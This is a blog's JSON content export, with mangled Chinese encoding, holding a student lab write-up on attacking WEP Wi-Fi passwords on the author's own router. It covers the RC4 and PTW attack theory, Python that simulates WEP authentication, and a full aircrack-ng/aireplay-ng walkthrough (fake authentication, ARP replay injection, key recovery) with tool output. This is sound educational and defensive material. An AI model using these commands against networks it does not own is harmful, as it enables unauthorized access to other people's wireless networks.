{"meta":{"title":"Mirage's Blog","subtitle":"éšå¿ƒè®°å½•ï½","description":"è¶Šè¿‡å±±ä¸˜ï¼Œæ‰å‘ç°æ— äººç­‰å€™","author":"Mirage","url":"https://qilianshuo.github.io","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2022-02-04T05:21:49.000Z","updated":"2022-02-04T05:22:24.616Z","comments":true,"path":"categories/index.html","permalink":"https://qilianshuo.github.io/categories/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2022-02-04T05:20:53.000Z","updated":"2022-02-04T05:21:37.922Z","comments":true,"path":"tags/index.html","permalink":"https://qilianshuo.github.io/tags/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2022-02-04T05:22:48.000Z","updated":"2022-02-04T05:23:23.314Z","comments":true,"path":"link/index.html","permalink":"https://qilianshuo.github.io/link/index.html","excerpt":"","text":""}],"posts":[{"title":"WEPå£ä»¤å®éªŒ","slug":"WEPå£ä»¤å®éªŒ","date":"2022-04-25T10:35:22.000Z","updated":"2022-04-25T10:47:52.593Z","comments":true,"path":"2022/04/25/WEPå£ä»¤å®éªŒ/","link":"","permalink":"https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/","excerpt":"WEP Wi-Fiå£ä»¤æ”»å‡»å®éªŒå®éªŒç›®çš„ äº†è§£WEPè®¤è¯åè®®æµç¨‹å’Œå…¶å®‰å…¨ç¼ºé™·ã€‚ æŒæ¡åè®®æ”»å‡»åŸç†å’Œæµå¯†ç çš„åº”ç”¨ã€‚ å®éªŒç¯å¢ƒé…ç½®APé…ç½®","text":"WEP Wi-Fiå£ä»¤æ”»å‡»å®éªŒå®éªŒç›®çš„ äº†è§£WEPè®¤è¯åè®®æµç¨‹å’Œå…¶å®‰å…¨ç¼ºé™·ã€‚ æŒæ¡åè®®æ”»å‡»åŸç†å’Œæµå¯†ç çš„åº”ç”¨ã€‚ å®éªŒç¯å¢ƒé…ç½®APé…ç½®&emsp;&emsp;PHICOMMè£´è®¯K2è·¯ç”±å™¨ï¼Œåˆ·æœºåç¡•å›ºä»¶ã€‚APåŠ å¯†æ¨¡å¼ä¸ºWEP- Open Systemï¼Œå£ä»¤è®¾ç½®ä¸ºWEPAttackTestã€‚ æ”»å‡»ç¯å¢ƒ&emsp;&emsp;macOS Montereyä¸»æœº + Kaliè™šæ‹Ÿæœº + USBå¤–ç½®ç½‘å¡ã€‚ å®éªŒè¦æ±‚ é€šè¿‡arpæ¬ºéª—è·å–å£ä»¤ï¼ˆä¿—ç§°å¯†ç ï¼‰ ç¼–ç¨‹å®ç°WEPè®¤è¯åè®® è§£æå£ä»¤è·å–çš„åŸç†å’Œè¿‡ç¨‹ åˆ†æWAPè®¤è¯åè®®å¦‚ä½•æŠµæŠ—è¯¥æ”»å‡»æ–¹æ³• åŸç†åˆ†æ WEPåè®®çš„å®‰å…¨æ€§ä¾èµ–äºRC4åŠ å¯†ç®—æ³•çš„å®‰å…¨æ€§ï¼ŒåŒæ—¶IEEE802.11åè®®çš„ä¸€äº›å®‰å…¨é—®é¢˜ä½¿æ”»å‡»æ›´å®¹æ˜“å®Œæˆã€‚ RC4åŠ å¯†åˆ†æ&emsp;&emsp;RC4çš„æœ¬è´¨æ˜¯æµå¯†ç çš„å¼‚æˆ–åŠ å¯†ï¼Œä¸ºäº†è·å–ä¸æ˜æ–‡ç­‰é•¿çš„å¯†é’¥æµï¼Œä½¿ç”¨äº†ä¸¤ä¸ªç®—æ³•ï¼šKey Scheduling Algorithm(RC4-KSA)å’ŒPseudo Random Generator Algorithm(PRGA)ã€‚ &emsp;&emsp;RC4ä½¿ç”¨ä¸€ä¸ªé•¿åº¦ä¸º256çš„å­—èŠ‚æ•°ç»„Sï¼Œæ¯æ¬¡ä»ä¸­éšæœºé€‰æ‹©ä¸€ä½ä½œä¸ºå¯†é’¥æµçš„ä¸€éƒ¨åˆ†ã€‚å¯ä»¥çœ‹å‡ºå¯†é’¥æµçš„ç”Ÿæˆæœ¬è´¨æ˜¯éšæœºæ•°çš„ç”Ÿæˆï¼Œä½¿ç”¨å¯†é’¥ä½œä¸ºåˆå§‹ç§å­ï¼Œé€šè¿‡ç®—æ³•å»ä¸æ–­è¿­ä»£ç”Ÿæˆéšæœºå¯†é’¥æµã€‚ &emsp;&emsp;å¯†é’¥è°ƒåº¦ç®—æ³•KSAçš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š \\begin{aligned} &for \\quad i = 0 \\quad to \\quad{n-1} \\quad do\\\\ &\\quad S[i] = i\\\\ &end\\\\ &for \\quad i = 0 \\quad to \\quad{n-1} \\quad do\\\\ &\\quad j = RND(n)\\\\ &\\quad swap(S,i,j)\\\\ &end\\\\ \\end{aligned}&emsp;&emsp;ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•PRGAçš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š \\begin{aligned} &i=0\\\\ &j=0\\\\ &loop\\\\ &\\quad i = i + 1 \\mod n\\\\ &\\quad j = RND(n)\\\\ &\\quad swap(S,i,j)\\\\ &\\quad print \\ S[S[i]+S[j] \\mod n]\\\\ &end \\ loop\\\\ \\end{aligned}&emsp;&emsp;PRGAå¯ä»¥æ˜¯ä¸€ä¸ªæ— é™é•¿çš„å¾ªç¯ï¼Œå¾ªç¯æ¬¡æ•°å–å†³äºéœ€è¦åŠ å¯†çš„æ•°æ®é•¿åº¦ï¼Œæ¯å¾ªç¯ä¸€æ¬¡ç”Ÿæˆä¸€ä½å¯†é’¥å­—èŠ‚ï¼Œæœ€ç»ˆå¾—åˆ°ä¸æ˜æ–‡ç­‰é•¿çš„å¯†é’¥æµï¼Œä¸æ˜æ–‡é€ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–å¤„ç†ï¼Œå°±å¾—åˆ°äº†å¯†æ–‡ã€‚ WEPè®¤è¯åˆ†æ&emsp;&emsp;ä¸ºäº†ä½¿å¯†é’¥å…·æœ‰éšæœºæ€§ï¼ŒWEPå¼•å…¥äº†åˆå§‹å‘é‡initialization vectorï¼ˆIVï¼‰ï¼ŒæŠŠIVæ·»åŠ åˆ°å¯†é’¥å¤´ç”Ÿæˆæ–°çš„å¯†é’¥ï¼Œè¿™æ ·æ¯æ¬¡ç”¨æ¥ç”Ÿæˆå¯†é’¥æµçš„éšæœºç§å­éƒ½ä¼šä¸åŒï¼Œä»¥å¢å¼ºåè®®çš„å®‰å…¨æ€§ã€‚ STAå‘APå‘é€Authentication Requestè®¤è¯è¯·æ±‚ã€‚ APç”Ÿæˆä¸€ä¸ªéšæœºå­—ç¬¦ä¸²(challenge)ï¼Œæ˜æ–‡å‘é€ç»™STAã€‚ STAä½¿ç”¨å¯†é’¥åŠ å¯†challengeï¼ŒæŠŠå¯†æ–‡å‘ç»™APã€‚ APä½¿ç”¨æ­£ç¡®å¯†é’¥è§£å¯†STAå‘æ¥çš„å¯†æ–‡ï¼Œå¦‚æœè§£å¯†åçš„æ•°æ®å’Œchallengeç›¸åŒï¼Œè¿”å›è®¤è¯æˆåŠŸå“åº”ï¼Œå¦åˆ™è¿”å›å¤±è´¥å“åº”ã€‚ ç¼–ç¨‹æ¨¡æ‹ŸWEPè®¤è¯è¿‡ç¨‹ ä½¿ç”¨scapyåº“å¯ä»¥å®Œæˆç½‘å¡å‘åŒ…ï¼Œå®Œå…¨ä»¿çœŸWEPè®¤è¯è¿‡ç¨‹ã€‚ç”±äºæ²¡æœ‰å……è¶³çš„æ—¶é—´ï¼Œæš‚æ—¶ä½¿ç”¨socketå®ç°STAå’ŒAPé—´é€šä¿¡ã€‚ RC4.py â€” å®ŒæˆRC4åŠ å¯†åŠè§£å¯† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding: UTF-8 -*-class RC4: n = 256 __S = [i for i in range(n)] __T = [] __K = list() l = 0 def __init__(self, key: str): self.__K = key.encode() self.l = len(self.__K) self._KSA() def _KSA(self) -&gt; None: j = 0 for i in range(self.n): j = (j + self.__S[i] + self.__K[i % self.l]) % self.n self.__S[i], self.__S[j] = self.__S[j], self.__S[i] def PRGA(self, length) -&gt; None: i = 0 j = 0 key_stream = [] self.__T = self.__S.copy() while length: i = (i + 1) % self.n j = (j + self.__T[i]) % self.n self.__T[i], self.__T[j] = self.__T[j], self.__T[i] k = (self.__T[i] + self.__T[j]) % self.n key_stream.append(self.__T[k]) length -= 1 return key_stream def encrypt(self, plaintext) -&gt; str: key_stream = self.PRGA(len(plaintext)) plain_stream = plaintext.encode() cipher = &#x27;&#x27; for i in range(len(plaintext)): cipher += hex(plain_stream[i] ^ key_stream[i]).upper()[2:].rjust(2, &#x27;0&#x27;) return cipher def decrypt(self, ciphertext: str) -&gt; str: cipher_byte = [int(ciphertext[i:i + 2], 16) for i in range(0, len(ciphertext), 2)] key_stream = self.PRGA(len(cipher_byte)) plain = &#x27;&#x27; for i in range(len(cipher_byte)): plain += chr(cipher_byte[i] ^ key_stream[i]) return plain STA.py â€” æ¨¡æ‹Ÿè®¤è¯ç»ˆç«¯ 123456789101112131415161718192021222324# -*- coding: UTF-8 -*-import socketfrom RC4 import RC4client = socket.socket()client.connect((&#x27;127.0.0.1&#x27;, 6968))rc4 = RC4(&#x27;Mirage&#x27;)# 1. å‘èµ·è®¤è¯è¯·æ±‚print(&#x27;1. Send AuthenticationRequest&#x27;)data = &quot;AuthenticationRequest&quot;client.send(bytes(data, encoding=&quot;utf-8&quot;))data = client.recv(1024)data = data.decode()# 2. å‘é€åŠ å¯†åçš„å­—ç¬¦ä¸²if data.startswith(&#x27;AuthenticationChallenge&#x27;): challenge = data[23:] cipher = rc4.encrypt(challenge) print(&#x27;2. Use RC4 to encrypt the challenge:&#x27;, challenge) client.send(cipher.encode()) data = client.recv(1024) data = data.decode() print(&#x27;3.&#x27;, data) AP.py â€” æ¨¡æ‹ŸAPè·¯ç”± 123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding: UTF-8 -*-from RC4 import RC4import randomimport socketdef random_generator(length: int) -&gt; str: return &#x27;&#x27;.join(random.sample( [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;], length ))rc4 = RC4(&#x27;Mirage&#x27;)server = socket.socket()server.bind((&quot;127.0.0.1&quot;, 6968))server.listen()tmp = dict()while True: con, addr = server.accept() while True: data = con.recv(1024) if not data: break data = data.decode() if data == &#x27;AuthenticationRequest&#x27;: challenge = random_generator(20) tmp[addr[0]] = challenge print(addr[0], challenge) con.send((&#x27;AuthenticationChallenge&#x27; + challenge).encode()) else: print(rc4.decrypt(data)) print(tmp.get(addr[0])) if rc4.decrypt(data) == tmp.get(addr[0]): print(str(addr), &#x27;AuthenticationResponseSuccess&#x27;) con.send(&#x27;AuthenticationResponseSuccess&#x27;.encode()) else: print(str(addr), &#x27;AuthenticationResponseFail&#x27;) con.send(&#x27;AuthenticationResponseFail&#x27;.encode()) ä¸RC4æ— å…³çš„æ”»å‡» è®¤è¯æ”»å‡» æ”»å‡»è€…é€šè¿‡æ•è·STAå’ŒAPä¹‹é—´äº¤æ¢çš„è®¤è¯æ•°æ®åŒ…ï¼Œæ„é€ æ–°çš„åˆæ³•è®¤è¯ã€‚aireplay-ngå·¥å…·å®ç°äº†è¯¥æ”»å‡»ï¼Œ-1ä¸ºè¯¥æ”»å‡»æ¨¡å¼ã€‚ æ•°æ®åŒ…æ³¨å…¥æ”»å‡» æ”»å‡»è€…æ•è·WEPç½‘ç»œçš„æ•°æ®åŒ…ï¼Œä¸€æ®µæ—¶é—´åé‡æ”¾ï¼Œåˆ†ä¸ºæ™®é€šæ³¨å…¥å’ŒARPæ³¨å…¥ã€‚æœ¬æ¬¡å®éªŒä½¿ç”¨åˆ°å¤§é‡ARPåŒ…ï¼Œaireplay-ngå·¥å…·çš„-3æ¨¡å¼ä¸ºARPé‡æ”¾æ³¨å…¥æ”»å‡»ã€‚ç”±äºWEPåè®®æ²¡æœ‰é‡å¤IVè¿‡æ»¤æœºåˆ¶ï¼Œå¯¼è‡´åªè¦æŠ“åˆ°ä¸€ä¸ªARPè¯·æ±‚ï¼Œæ”»å‡»è€…å°±å¯ä»¥å¤§é‡å¤åˆ¶è¯¥è¯·æ±‚åŒ…å¹¶é‡æ”¾æ¥æŠ“å–APçš„ARPå“åº”ã€‚ ä¸RC4æœ‰å…³çš„æ”»å‡» FMSæ”»å‡»ã€KoreKæ”»å‡» éœ€è¦è¾ƒå¤šçš„è®¡ç®—èµ„æºï¼Œå¹¶æœªå¯¹WEPåè®®é€ æˆè‡´å‘½æ‰“å‡»ï¼Œä¸åœ¨æ­¤è¯¦ç»†ä»‹ç»ã€‚ Kleinæ”»å‡» è¯¥æ”»å‡»åˆ©ç”¨Jenkiså…³è”ï¼Œå¯ä»¥è¯æ˜ï¼š$Prob(K[l] = S_l^{-1}(l - X[l-1] - j_l - S_l[l]) = q(2/n) + (1-q)((n-2)/n(n-1))$å¤§çº¦ä¸º$1.3676/n$ï¼Œå…¶ä¸­ï¼Œ$q=(1-1/n)^{n-2}$ã€‚ æ”»å‡»å½¢å¼ä¸ºï¼š F_{Klein}(K[0],K[1],\\cdots,K[l-1],X[l-1]) = S_l^{-1}[l-X[l-1]] - j_l - S_l[l] PTWæ”»å‡» PTWæ”»æ˜¯WEPå®‰å…¨æ€§çš„åˆ†æ°´å²­ï¼Œåœ¨æ­¤ä¹‹å‰çš„æ”»å‡»è¦ä¹ˆå› ä¸ºéœ€è¦å¤§é‡æ•°æ®åŒ…è¦ä¹ˆéœ€è¦å¤§é‡è®¡ç®—è€Œå…·æœ‰è¾ƒé«˜çš„æ”»å‡»é—¨æ§›ï¼Œè€ŒPTWæ”»å‡»åªéœ€è¦ä½¿ç”¨å‡ åƒåˆ°å‡ ä¸‡ä¸ªARPåŒ…å¹¶ç”¨å°‘é‡çš„è®¡ç®—å°±èƒ½æ”»ç ´å¯†ç ã€‚ è¯¥æ”»å‡»çš„ä¸»è¦æ€æƒ³ä¸ºç”±å†³å®šå¯†é’¥å•ä¸ªå­—èŠ‚æ”¹å˜å†³å®š$\\sigma_i = \\sum\\limits_{m=0}^iRk[m]$ã€‚ å°†Kleinæ”»å‡»æ‰©å±•ä¸º2ä¸ªå¯†é’¥Byteçš„å’Œã€‚å¯ä»¥è¯æ˜ï¼š$Prob(K[l]+K[l+1]=S_l^{-1}(l+1-X[l])-j_l-S_l[l]-S_l[l+1])$ä¸º$q_2((n-1)/n)^{n-2}(2/n)+(1-q_2((n-1)/n)^{n-2})((n-2)/n(n-1))$ã€‚å…¶ä¸­ï¼Œ$q_2$ä¸º$((n-1)/n)^3$ã€‚ PTW2æ”»å‡»å½¢å¼ä¸ºï¼š F_{PTW2}(K[0],K[1],\\cdots,K[l-1],X[l]) = S_l^{-1}[l+1-X[l]] - j_l - S_l[l] - S_l[l+1] ç»§ç»­æ‰©å±•ä¸ºmä¸ªå¯†é’¥Byteçš„å’Œã€‚å¯ä»¥è¯æ˜ï¼š Prob(\\sum_{a=l}^{l+m-1}K[a] = S_l^{-1}(l+m+1-X[l+m-2])-j_l-\\sum_{a=l}^{l+m-1}S_l[a])ä¸º$q_m((n-1)/n)^{n-2}(2/n)+(1-q_m((n-1)/n)^{n-2})((n-2)/n(n-1))$ã€‚å…¶ä¸­ï¼Œ$q_m$ä¸º$(\\frac {n-1}{n})^{m-1}(\\frac{n-m+1}{n})\\mathop{\\Pi}\\limits_{a=1}^{m-1}(\\frac{n-a}{n})$ã€‚ PTWæ”»å‡»å½¢å¼ä¸ºï¼š F_{PTWm}(K[0],K[1],\\cdots,K[l-1],X[l+m-2]) = S_l^{-1}[l+m-1-X[l+m-2]] - j_l - \\sum\\limits_{a=l}^{l+m-1}S_l[a] å®éªŒæ­¥éª¤ç¡®è®¤ç›®æ ‡ åœ¨MacOSä¸Šä½¿ç”¨airportå·¥å…·æ‰«æé™„è¿‘APï¼Œç¡®è®¤æ”»å‡»ç›®æ ‡æ‰€åœ¨ä¿¡é“ã€‚æ‰«æå‘½ä»¤ä¸ºï¼š 1airport -s æˆ–åœ¨Kaliä¸­ä½¿ç”¨airodump-ngå·¥å…·æ‰«æï¼Œç¡®è®¤ç›®æ ‡ä¿¡é“åŠMACåå†é”å®šç½‘å¡ä¿¡é“ã€‚ åœ¨kaliè™šæ‹Ÿæœºä¸­å°†ç½‘å¡å¼€å¯ç›‘å¬æ¨¡å¼ï¼ŒåŒæ—¶é”å®šç›®æ ‡ä¿¡é“ã€‚ 1airmon-ng start wlan0 13 ä½¿ç”¨iwconfigå‘½ä»¤ç¡®è®¤ç½‘å¡æ˜¯å¦å¼€å¯monitoræ¨¡å¼ã€‚ æµ‹è¯•æ³¨å…¥å¯è¡Œæ€§ -9 æ³¨å…¥æµ‹è¯•æ¨¡å¼-e ç›®æ ‡ESSID-a ç›®æ ‡MAC 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]â””â”€# aireplay-ng -9 -e Mirage -a 74:7D:24:AC:83:C0 wlan0mon09:35:07 Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 1309:35:07 Trying broadcast probe requests...09:35:07 Injection is working!09:35:09 Found 1 AP 09:35:09 Trying directed probe requests...09:35:09 74:7D:24:AC:83:C0 - channel: 13 - &#x27;Mirage&#x27;09:35:09 Ping (min/avg/max): 1.546ms/11.259ms/36.031ms Power: -42.6909:35:09 29/30: 96% ç›‘å¬ç›®æ ‡ ä½¿ç”¨airodump-ngæŠ“åŒ… -c æŒ‡å®šç›‘å¬ä¿¡é“ â€”bssid æŒ‡å®šç›‘å¬ç›®æ ‡MAC -w ä¿å­˜çš„æŠ“åŒ…æ•°æ®æ–‡ä»¶å 12345678910111213â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]â””â”€# airodump-ng -c 13 --bssid 74:7D:24:AC:83:C0 -w crackPKT wlan0mon09:57:34 Created capture file &quot;crackPKT-01.cap&quot;.CH 13 ][ Elapsed: 4 mins ][ 2022-04-23 10:01 ][ Are you sure you want to quit? Press Q agai BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 74:7D:24:AC:83:C0 -65 0 1621 35813 54 13 54e. WEP WEP OPN Mirage BSSID STATION PWR Rate Lost Frames Notes Probes 74:7D:24:AC:83:C0 D0:5A:FD:F0:4E:09 -18 1e- 1e 0 36064 74:7D:24:AC:83:C0 70:F1:1C:3D:6E:41 -60 6 - 1 3942 138117 é‡æ”¾æ³¨å…¥æ”»å‡» ä½¿ç”¨aireplay-ngå»ºç«‹ä¸€ä¸ªè™šå‡è®¤è¯ã€‚ -1 è™šå‡è®¤è¯æ”»å‡»6000 æ¯éš”6000ç§’é‡æ–°å‘èµ·ä¸€æ¬¡è®¤è¯-o 1 æ¯æ¬¡è®¤è¯åªå‘é€ä¸€ä¸ªåŒ…ï¼Œ é»˜è®¤å‘é€å¤šä¸ª-q 10 æ¯éš”10ç§’å‘é€ä¸€æ¬¡keep-aliveè¯·æ±‚ 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]â””â”€# aireplay-ng -1 6000 -o 1 -q 10 -e Mirage -a 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon09:58:04 Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 1309:58:04 Sending Authentication Request (Open System) [ACK]09:58:04 Authentication successful09:58:04 Sending Association Request09:58:04 Association successful :-) (AID: 1)09:58:14 Sending keep-alive packet [ACK] 09:58:24 Sending keep-alive packet [ACK] å¼€å§‹ARPé‡æ”¾æ”»å‡»ï¼Œåˆ¶é€ å¤§é‡ARPè¯·æ±‚ -3 ARPæ³¨å…¥æ”»å‡»æ¨¡å¼ -b ç›®æ ‡MAC -h æœ¬æœºMAC 123456â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]â””â”€# aireplay-ng -3 -b 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon 09:58:29 Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13Saving ARP requests in replay_arp-0423-095829.capYou should also start airodump-ng to capture replies.Read 194286 packets (got 73132 ARP requests and 42780 ACKs), sent 73276 packets...(499 pps) ç ´è§£å¯†ç  ä½¿ç”¨aircrack-ngè§£å¯†æ•è·çš„æ•°æ®åŒ…ï¼ˆé»˜è®¤ä½¿ç”¨PTWæ”»å‡»ç ´è§£ï¼Œå¦‚éœ€FMS/KoreKæ”»å‡»ä½¿ç”¨-Kå‚æ•°ï¼‰ â€”bssid éœ€è¦è§£å¯†çš„APçš„BSSID 123456789101112131415161718192021222324252627282930313233â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]â””â”€# aircrack-ng --bssid 74:7D:24:AC:83:C0 crackPKT*.cap Reading packets, please wait...Opening crackPKT-01.capRead 257915 packets.1 potential targets Got 35812 out of 35000 IVsStarting PTW attack with 35812 ivs.Attack will be restarted every 5000 captured ivs. Aircrack-ng 1.6 [00:00:00] TesAircrack-ng 1.6 (got 30170 IVs) [00:00:00] Tested 1632001 keys (got 30170 IVs) KB depth byte(vote) [00:00:00] Tested 1785601 keys (got 30170 IVs) KB depth byte(vote)D[00:00:01] Tested 314088 keys (got 35812 IVs) KB depth byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) KB depth byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) 0 0/ 1 57(50176) 23(44800) E5(44544) 43(43776) D7(43776) DD(43520) 0E(43008) 1 0/ 1 45(46080) 84(42496) 86(42496) 94(41984) 83(41728) 2B(41472) 6A(41472) 2 0/ 1 50(52736) EB(45824) CA(44288) F9(43264) 17(42496) 85(42496) 8B(42496) 3 0/ 1 41(49408) EE(44288) 2E(43008) A7(43008) E7(42496) 34(42240) 30(41984) 4 0/ 1 74(54528) E7(44544) 73(43520) 64(43264) D7(43264) 9A(42496) AD(41728) 5 0/ 2 CD(44800) 15(44544) 70(41984) 89(41984) FC(41984) 80(41728) A1(41472) 6 0/ 1 61(46848) 04(44800) 51(43008) 01(42752) 81(41728) B9(41728) F4(41728) 7 0/ 1 63(46848) 3D(44544) 1A(43520) 9E(43520) 3B(42496) 5C(42496) 7B(42496) 8 0/ 1 6B(46336) DF(44032) CE(42496) 10(42240) 74(42240) 0B(41472) 4D(41472) 9 0/ 2 54(42496) 89(42496) 3F(42240) 7E(41984) 8C(41728) D2(41728) 07(41216) 10 5/ 1 C6(43008) 11(42496) A4(42240) F0(42240) 14(41984) CD(41984) 56(41728) 11 9/ 1 A0(40960) DA(40960) 20(40704) 82(40704) 28(40448) 6D(40448) 73(40448) 12 0/ 2 74(45172) 7E(45100) 82(44768) 98(43592) 3C(42896) 89(42536) 60(41988) KEY FOUND! [ 57:45:50:41:74:74:61:63:6B:54:65:73:74 ] (ASCII: WEPAttackTest ) Decrypted correctly: 100% å®éªŒåˆ†æå®éªŒç»“æœ&emsp;&emsp;ç»æµ‹è¯•ï¼Œåœ¨æ•æ‰åˆ°å¤§é‡æ•°æ®åŒ…çš„æƒ…å†µä¸‹ï¼Œå¯¹äº13ä½çš„å­—æ¯å¯†é’¥ï¼ŒPTWæ”»å‡»åªç”¨äº†å‡ ç§’é’Ÿä¾¿æˆåŠŸç ´è§£ï¼Œåœ¨ARPé‡æ”¾æ”»å‡»ä¸‹ï¼Œæ•è·è¿™äº›æ•°æ®åŒ…ä¹Ÿä»…ä»…ç”¨äº†å‡ åˆ†é’Ÿã€‚ &emsp;&emsp;WEPå¼•å…¥IVæœ¬æ„æ˜¯å¢å¼ºåè®®å®‰å…¨æ€§ï¼Œä½†åå€’å¯ä»¥æ ¹æ®IVå’ŒçŒœæµ‹åˆ°çš„æ˜æ–‡æ•°æ®åæ¨å‡ºéƒ¨åˆ†å¯†é’¥æµï¼Œä»è€Œæ›´å®¹æ˜“åœ°æ”»ç ´å¯†ç ã€‚ åˆ†æWPAæ”¹è¿›The Temporal Key Integrity Protocolï¼ˆTKIPï¼‰&emsp;&emsp;ä¸´æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼ˆTKIPï¼‰å¯ä»¥è¢«è§†ä¸ºWEPçš„ä¸€ä¸ªç»è¿‡å¤§é‡ä¿®æ”¹çš„ç‰ˆæœ¬ã€‚TKIPä»ç„¶ä½¿ç”¨RC4æµå¯†ç ï¼Œä½†æ¯”WEPå®‰å…¨å¾—å¤šã€‚TKIPçš„è®¾è®¡ç›®æ ‡å¹¶ä¸æ˜¯ä¸€ä¸ªå°½å¯èƒ½å®‰å…¨çš„åè®®ã€‚å–è€Œä»£ä¹‹çš„æ˜¯å¯¹WEPçš„ä¿®æ”¹ï¼Œå®ƒå¯ä»¥é˜²æ­¢æ‰€æœ‰å·²çŸ¥çš„æ”»å‡»ï¼Œæä¾›ç›¸å½“é«˜çš„å®‰å…¨çº§åˆ«ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å¤§å¤šæ•°ç°æœ‰ç¡¬ä»¶ä¸Šä½¿ç”¨ï¼Œåªéœ€å®‰è£…é©±åŠ¨ç¨‹åºæˆ–å›ºä»¶æ›´æ–°ã€‚ æ›¿æ¢RC4ä¸ºAES&emsp;&emsp;AESå¯†ç å¯ä»¥åœ¨è®¡æ•°å™¨æ¨¡å¼counter mode(CCMP)ä¸‹ç”¨äºåŠ å¯†ç½‘ç»œä¼ è¾“å¹¶ä¿æŠ¤å™¨å®Œæ•´æ€§ã€‚è¿™å®Œå…¨å–ä»£äº†RC4æµå¯†ç ç®—æ³•ï¼Œå¹¶æä¾›äº†éå¸¸é«˜çš„å®‰å…¨çº§åˆ«ã€‚ç›®å‰ï¼ŒAESä¸­è¿˜æ²¡æœ‰å·²çŸ¥çš„å¯å®ç°å¼±ç‚¹ã€‚ å¯†é’¥ç®¡ç†&emsp;&emsp;IEEE 802.11å¢åŠ äº†ä¼ä¸šçº§å¯†é’¥ç®¡ç†ï¼Œå…è®¸å¤šç§è®¤è¯æ¨¡å¼ã€‚STAä¸å†éœ€è¦ä¸€ä¸ªå•ç‹¬çš„ç§˜å¯†é¢„å…±äº«å¯†é’¥ï¼Œè€Œæ˜¯éœ€è¦ç”¨æˆ·åå’Œå¯†ç ã€æ™ºèƒ½å¡ã€è¯ä¹¦ã€ç¡¬ä»¶å¯†ç å™¨å’Œå…¶ä»–èº«ä»½éªŒè¯åè®®ã€‚é™¤äº†å¹¿æ’­ï¼Œ æ¯ä¸ªç«™ç‚¹éƒ½ä½¿ç”¨å•ç‹¬çš„å¯†é’¥ä¸æ¥å…¥ç‚¹é€šä¿¡ï¼Œå› æ­¤åŒä¸€ç½‘ç»œä¸­çš„å¦ä¸€ä¸ªç«™ç‚¹ä¸å†å¯èƒ½è¿›è¡Œçªƒå¬ã€‚ å‚è€ƒæ–‡çŒ® Attacks on the WEP protocol A. Klein. Attacks on the RC4 stream cipher. Designs, Codes and Cryptography, 48(3):269â€“286, 2008. å¯†ç åˆ†æå­¦â€”â€”æ·±åº¦åˆ†æWEPå¯†é’¥æ¢å¤æ”»å‡»ï¼ˆPTWæ”»å‡»ï¼‰","categories":[],"tags":[{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://qilianshuo.github.io/tags/%E5%AF%86%E7%A0%81/"}]},{"title":"AndroidæŠ“åŒ…æ€»ç»“","slug":"AndroidæŠ“åŒ…æ•´ç†å½’çº³","date":"2022-03-26T14:42:36.000Z","updated":"2022-03-26T15:18:58.884Z","comments":true,"path":"2022/03/26/AndroidæŠ“åŒ…æ•´ç†å½’çº³/","link":"","permalink":"https://qilianshuo.github.io/2022/03/26/Android%E6%8A%93%E5%8C%85%E6%95%B4%E7%90%86%E5%BD%92%E7%BA%B3/","excerpt":"","text":"æŒç»­è®°å½•æ›´æ–°ä¸­ï½ğŸš€ 